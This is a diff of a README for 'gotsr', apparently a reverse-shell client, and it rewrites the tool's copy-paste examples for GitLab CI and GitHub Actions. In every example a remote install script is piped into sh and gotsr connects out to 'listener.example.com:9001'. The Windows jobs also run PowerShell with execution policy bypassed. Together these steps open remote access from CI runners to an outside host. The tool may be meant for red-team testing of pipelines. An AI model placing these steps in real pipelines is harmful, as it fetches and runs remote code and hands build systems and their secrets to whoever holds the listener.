@@ -94,57 +94,44 @@ The client validates the server certificate during the TLS handshake:
 
 The following examples can be copied to run `gotsr` in common CI/CD environments.
 
-GitLab CI (`.gitlab-ci.yml`):
-  ```yaml
-  stages: [run]
-  reverse:
-    stage: run
-    image: alpine:3.19
-    script:
-      - apk add --no-cache curl
-      - curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
-      - ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
-  ```
-
-GitLab CI (Windows runner, PowerShell):
-  ```yaml
-stages: [run]
+### GitLab CI
+```yaml
+reverse-linux:
+  stage: test
+  image: alpine:3.19
+  script:
+    - apk add --no-cache curl
+    - curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
+    - ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
 reverse-win:
-  stage: run
+  stage: test
   tags: [saas-windows-medium-amd64]
   script:
-    - powershell -NoProfile -ExecutionPolicy Bypass -File ".\download-and-run-gotsr.ps1"
- # download the script from ./examples/download‑and‑run‑gotsr.ps1 and add it to your test repository
-  ```
+    - powershell -NoProfile -ExecutionPolicy Bypass -File ".\download-and-run-gotsr.ps1" # add the script to the repository by copying it from this repos ./examples folder and updating the target in the script.
+```
 
-GitHub Actions:
-  ```yaml
-  name: reverse
-  on: [workflow_dispatch]
-  jobs:
-    run-reverse:
-      runs-on: ubuntu-latest
-      steps:
-        - name: Install gotsr client
-          run: curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
-        - name: Run gotsr
-          run: ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
-  ```
-
-GitHub Actions (Windows, PowerShell):
-  ```yaml
-  name: reverse-windows
-  on: [workflow_dispatch]
-  jobs:
-    run-reverse:
-      runs-on: windows-latest
-      steps:
-        - name: Install gotsr client (PowerShell)
-          shell: pwsh
-          run: |
-            & "C:/Program Files/Git/bin/bash.exe" -lc "curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh"
-        - name: Run gotsr (PowerShell)
-          shell: pwsh
-          run: |
-            & "$HOME/.local/bin/gotsr" --target listener.example.com:9001 --retries 3
-  ```
+### GitHub Actions
+```yaml
+name: GOTSR
+on: [workflow_dispatch]
+permissions: {}
+jobs:
+  linux:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install gotsr client
+        run: curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
+      - name: Run gotsr
+        run: ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
+  windows:
+    runs-on: windows-latest
+    steps:
+      - name: Install gotsr client (PowerShell)
+        shell: pwsh
+        run: |
+          & "C:/Program Files/Git/bin/bash.exe" -lc "curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh"
+      - name: Run gotsr (PowerShell)
+        shell: pwsh
+        run: |
+          & "$HOME/.local/bin/gotsr" --target listener.example.com:9001 --retries 3
+```
